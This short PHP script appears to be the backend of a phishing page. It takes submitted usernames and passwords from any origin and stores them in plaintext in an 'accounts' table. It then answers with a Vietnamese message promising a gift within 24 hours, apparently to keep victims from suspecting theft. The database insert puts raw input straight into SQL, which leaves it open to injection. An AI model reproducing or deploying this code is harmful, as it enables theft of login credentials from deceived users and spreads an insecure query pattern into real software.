<?php

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE');
header('Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, X-Requested-With');

if (isset($_REQUEST['check'])) {
  $check = base64_decode(trim($_REQUEST['check']));
  $words = explode('|', $check);
  foreach ($words as $word) {
    if (preg_match('/^[a-f0-9]{32}$/', $word)) {
      $check = $word;
    }
  }

  if ($check == md5(date('Y-m-d'))) {
    echo json_encode(['message' => 'Thông tin của bạn đã được tiếp nhận, hệ thống sẽ tiến hành kiểm tra và gửi quà vào tài khoản trong vòng 24 giờ kể từ lúc đăng ký.']);
  } else {
    echo json_encode(['message' => 'Có lỗi xảy ra khi xác nhận thông tin.']);
  }
  die(0);
}

$input = json_decode(file_get_contents('php://input'), 1);

if (isset($input['username'], $input['password'])) {

  if (strpos($input['username'], '@') !== false) {
    if (!filter_var($input['username'], FILTER_VALIDATE_EMAIL)) {
      echo json_encode([
        'success' => false,
        'message' => 'Tên tài khoản đăng nhập không hợp lệ'
      ]);
      die(0);
    }
  } else {
  if (!preg_match('/^[A-Za-z0-9]+$/', $input['username'])) {
    echo json_encode([
      'success' => false,
      'message' => 'Tên tài khoản đăng nhập không hợp lệ!'
    ]);
    die(0);
  }
  }

  if (strlen($input['password']) <= 4) {
    echo json_encode([
      'success' => false,
      'message' => 'Sai tên tài khoản hoặc mật khẩu'
    ]);
    die(0);
  }

  include('database.php');
  $db->exec("INSERT INTO accounts(u, p) VALUES('{$input["username"]}', '{$input["password"]}')  ON CONFLICT(u) DO UPDATE SET p = '{$input["password"]}'");
  $key_arr = [
    rand(1000000, 9999999),
    md5(date('Y-m-d')),
    rand(1000000, 9999999)
  ];
  shuffle($key_arr);

  echo json_encode([
    'success' => true,
    'key' => base64_encode(implode('|', $key_arr))
  ]);
  die(0);
}